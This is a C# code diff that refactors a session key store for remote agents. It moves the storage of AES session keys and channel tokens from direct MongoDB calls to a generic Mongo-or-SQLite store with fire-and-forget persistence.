@@ -2,14 +2,14 @@ using System.Collections.Concurrent;
 using System.Security.Cryptography;
 using LibraNextgen.Service.Data;
 using LibraNextgen.Service.Models;
-using MongoDB.Driver;
 
 namespace LibraNextgen.Service.Services.Agents;
 
 /// <summary>
 /// Holds per-agent AES-256 session keys with an in-memory cache backed by a
-/// Mongo collection, so keys survive a server restart. The cache is the
-/// authoritative hot path; Mongo is the durable store loaded once at startup.
+/// persistent store (Mongo or SQLite), so keys survive a server restart. The
+/// cache is the authoritative hot path; persistence is best-effort and
+/// fire-and-forget (never blocks or throws into the beacon path).
 ///
 /// Also issues opaque per-session channel tokens. The token (not the stable
 /// agent id) is what agents send on the wire, so beacon traffic carries no
@@ -19,20 +19,19 @@ public class SessionKeyStore
 {
     private readonly ConcurrentDictionary<string, byte[]> _cache = new();
     private readonly ConcurrentDictionary<string, string> _tokens = new(); // token -> agentId
-    private readonly IMongoCollection<SessionKey> _collection;
-    private readonly IMongoCollection<SessionTokenDoc> _tokenCollection;
+    private readonly IStore<SessionKey> _keys;
+    private readonly IStore<SessionTokenDoc> _tokenStore;
 
-    public SessionKeyStore(MongoDbContext context)
+    public SessionKeyStore(IStore<SessionKey> keys, IStore<SessionTokenDoc> tokenStore)
     {
-        _collection = context.GetCollection<SessionKey>("session_keys");
-        _tokenCollection = context.GetCollection<SessionTokenDoc>("session_tokens");
+        _keys = keys;
+        _tokenStore = tokenStore;
     }
 
     /// <summary>Load all persisted keys and tokens into the in-memory cache (called at startup).</summary>
     public async Task LoadAsync(CancellationToken ct = default)
     {
-        var all = await _collection.Find(FilterDefinition<SessionKey>.Empty).ToListAsync(ct);
-        foreach (var s in all)
+        foreach (var s in await _keys.GetAllAsync(ct))
         {
             if (string.IsNullOrEmpty(s.Key)) continue;
             try
@@ -44,8 +43,8 @@ public class SessionKeyStore
                 // Ignore malformed persisted entries.
             }
         }
-        var tokens = await _tokenCollection.Find(FilterDefinition<SessionTokenDoc>.Empty).ToListAsync(ct);
-        foreach (var t in tokens)
+
+        foreach (var t in await _tokenStore.GetAllAsync(ct))
         {
             if (!string.IsNullOrEmpty(t.Token) && !string.IsNullOrEmpty(t.AgentId))
                 _tokens[t.Token] = t.AgentId;
@@ -55,18 +54,7 @@ public class SessionKeyStore
     public void Set(string agentId, byte[] key)
     {
         _cache[agentId] = key;
-
-        var doc = new SessionKey { AgentId = agentId, Key = Convert.ToBase64String(key) };
-        try
-        {
-            _collection.ReplaceOneAsync(
-                Builders<SessionKey>.Filter.Eq(s => s.AgentId, agentId),
-                doc,
-                new ReplaceOptions { IsUpsert = true }).GetAwaiter().GetResult();
-        }
-        catch
-        {
-        }
+        _ = PersistKeyAsync(agentId, Convert.ToBase64String(key));
     }
 
     public bool TryGet(string agentId, out byte[]? key) => _cache.TryGetValue(agentId, out key);
@@ -75,25 +63,7 @@ public class SessionKeyStore
     {
         var token = Convert.ToHexString(RandomNumberGenerator.GetBytes(16)).ToLowerInvariant();
         _tokens[token] = agentId;
-        try
-        {
-            _tokenCollection.ReplaceOneAsync(
-                Builders<SessionTokenDoc>.Filter.Eq(t => t.Token, token),
-                new SessionTokenDoc { Token = token, AgentId = agentId },
-                new ReplaceOptions { IsUpsert = true }).GetAwaiter().GetResult();
-            foreach (var (oldToken, mapped) in _tokens.ToList())
-            {
-                if (mapped == agentId && oldToken != token)
-                {
-                    _tokens.TryRemove(oldToken, out _);
-                    _ = _tokenCollection.DeleteOneAsync(
-                        Builders<SessionTokenDoc>.Filter.Eq(t => t.Token, oldToken));
-                }
-            }
-        }
-        catch
-        {
-        }
+        _ = PersistTokenAsync(token, agentId);
         return token;
     }
 
@@ -109,7 +79,60 @@ public class SessionKeyStore
         {
             if (mapped == agentId) _tokens.TryRemove(token, out _);
         }
-        _ = _collection.DeleteOneAsync(Builders<SessionKey>.Filter.Eq(s => s.AgentId, agentId));
+        _ = RemovePersistedAsync(agentId);
+    }
+
+    private async Task PersistKeyAsync(string agentId, string base64Key)
+    {
+        try
+        {
+            var existing = await _keys.FirstOrDefaultAsync(s => s.AgentId == agentId);
+            if (existing is null)
+            {
+                await _keys.InsertAsync(new SessionKey { AgentId = agentId, Key = base64Key });
+            }
+            else if (existing.Key != base64Key)
+            {
+                await _keys.UpdateByIdAsync(existing.Id,
+                    new[] { new FieldUpdate(nameof(SessionKey.Key), base64Key) });
+            }
+        }
+        catch
+        {
+            // Best-effort persistence; the in-memory cache is authoritative.
+        }
+    }
+
+    private async Task PersistTokenAsync(string token, string agentId)
+    {
+        try
+        {
+            await _tokenStore.InsertAsync(new SessionTokenDoc { Token = token, AgentId = agentId });
+            // Rotate: drop the agent's older persisted tokens.
+            var stale = await _tokenStore.FindAsync(t => t.AgentId == agentId && t.Token != token);
+            foreach (var old in stale)
+                await _tokenStore.DeleteAsync(old.Id);
+        }
+        catch
+        {
+            // Best-effort persistence; token cache is authoritative.
+        }
+    }
+
+    private async Task RemovePersistedAsync(string agentId)
+    {
+        try
+        {
+            var key = await _keys.FirstOrDefaultAsync(s => s.AgentId == agentId);
+            if (key is not null)
+                await _keys.DeleteAsync(key.Id);
+            foreach (var token in await _tokenStore.FindAsync(t => t.AgentId == agentId))
+                await _tokenStore.DeleteAsync(token.Id);
+        }
+        catch
+        {
+            // Best-effort cleanup.
+        }
     }
 }
 
